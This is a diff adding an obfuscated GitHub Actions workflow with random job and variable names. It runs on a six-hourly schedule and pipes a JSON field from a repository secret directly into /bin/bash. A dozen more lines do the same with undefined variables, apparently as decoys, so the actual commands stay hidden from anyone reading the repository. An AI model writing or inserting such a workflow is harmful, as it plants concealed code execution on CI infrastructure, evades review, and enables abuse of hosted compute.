@@ -1,0 +1,29 @@
+name: sheidoumeiyouu
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '6 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: sheidoumeiyouu
+        env:
+          nxiv78669: ${{ secrets.nxiv78669 }}
+        run: |
+          echo $nxiv78669 | jq -r .vrcub644 | /bin/bash
+          echo $mmt80 | jq -r .eqen4 | /bin/bash
+          echo $gd74 | jq -r .bgyl6 | /bin/bash
+          echo $m9606 | jq -r .qenkb01385 | /bin/bash
+          echo $scxm99 | jq -r .ctcu62166 | /bin/bash
+          echo $siln91 | jq -r .rb185 | /bin/bash
+          echo $fk919 | jq -r .w08 | /bin/bash
+          echo $rse54868 | jq -r .h80 | /bin/bash
+          echo $sed3 | jq -r .tt82 | /bin/bash
+          echo $veoq5 | jq -r .x28 | /bin/bash
+          echo $hdpnk4876 | jq -r .wrhk6 | /bin/bash
+          echo $i9515 | jq -r .zvv74610 | /bin/bash
+          echo $wfv8 | jq -r .yn4 | /bin/bash
+
